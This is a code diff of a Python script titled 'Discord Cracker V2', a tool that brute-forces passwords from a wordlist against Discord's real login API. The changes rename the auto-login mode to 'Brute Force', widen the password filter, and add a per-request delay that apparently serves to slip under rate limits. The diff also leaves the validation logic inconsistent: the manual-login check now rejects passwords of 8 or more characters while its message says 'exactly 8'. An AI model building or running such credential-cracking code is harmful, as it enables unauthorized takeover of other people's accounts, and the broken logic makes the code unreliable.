@@ -4,7 +4,7 @@ from datetime import datetime
 import os
 import time
 
-start_time = None  # Variable to store the start time
+start_time = None 
 
 def log(message, level="INFO"):
     timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
@@ -29,13 +29,13 @@ def stop_timer():
     return elapsed_time_str
 
 def main():
-    log("YT: Discord Cracker")
+    log("YT: Discord Cracker V2")
     log("--------------------")
 
     email = input("Enter your email: ")
 
     log("1: Normal login")
-    log("2: Auto login")
+    log("2: Brute Force")
     select = input()
 
     if select == "2":
@@ -48,7 +48,7 @@ def main():
         with open(password_file_path, 'r') as file:
             passwords = file.read().splitlines()
 
-        passwords = [password for password in passwords if len(password) == 8]
+        passwords = [password for password in passwords if len(password) >= 8]
 
         if not passwords:
             log("No passwords with exactly 8 characters found. Exiting...", "ERROR")
@@ -76,7 +76,7 @@ def main():
     else:
         password = input("Enter your password: ")
 
-        if len(password) != 8:
+        if len(password) >= 8:
             log("Password must be exactly 8 characters. Exiting...", "ERROR")
             return
 
@@ -96,6 +96,7 @@ def main():
 
 def test_login(email, password):
     try:
+        time.sleep(0.13)
         request_url = "https://discord.com/api/v9/auth/login"
         headers = {"Host": "discord.com"}
         data = {"login": email, "password": password}
